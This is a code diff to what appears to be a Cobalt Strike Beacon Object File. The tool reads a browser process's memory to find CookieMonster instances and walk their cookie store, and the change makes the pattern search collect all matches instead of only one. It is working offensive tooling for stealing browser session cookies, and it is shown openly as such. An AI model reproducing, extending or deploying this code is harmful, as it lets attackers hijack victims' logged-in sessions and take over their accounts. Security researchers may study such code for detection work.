@@ -165,16 +165,13 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Number of available cookies: %zu\n\n", cookieMap.size);
         // Process the first node of the binary search tree
         Node firstNode;
-        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr)) {
-            BeaconPrintf(CALLBACK_OUTPUT, "Starting first node\n");
+        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
             ProcessNode(hProcess, firstNode);
-        }
-        else {
+        else
             BeaconPrintf(CALLBACK_ERROR, "Error reading first node! Error: %i\n", GetLastError());
-        }
     }
 
-    BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t& resultAddress) {
+    BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster) {
 
         SYSTEM_INFO systemInfo;
         GetSystemInfo(&systemInfo);
@@ -194,20 +191,16 @@ extern "C" {
                     if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                         for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                             if (memcmp(buffer + i, pattern, patternSize) == 0) {
-                                if (hitcount > 0)
-                                {
-                                    resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
-                                    uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
+                                uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
+                                uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
 #ifdef _DEBUG
-                                    BeaconPrintf(CALLBACK_OUTPUT, "Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
-                                        memoryInfo.AllocationBase,
-                                        memoryInfo.BaseAddress,
-                                        offset);
+                                BeaconPrintf(CALLBACK_OUTPUT, "Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
+                                    memoryInfo.AllocationBase,
+                                    memoryInfo.BaseAddress,
+                                    offset);
 #endif
-                                    free(buffer);
-                                    return TRUE;
-                                }
-                                hitcount++;
+                                cookieMonsterInstances[szCookieMonster] = resultAddress;
+                                szCookieMonster++;
                             }
                         }
                     }
@@ -228,7 +221,8 @@ extern "C" {
                 break;
             }
         }
-
+        if (szCookieMonster > 0)
+            return TRUE;
         return FALSE;
     }
 
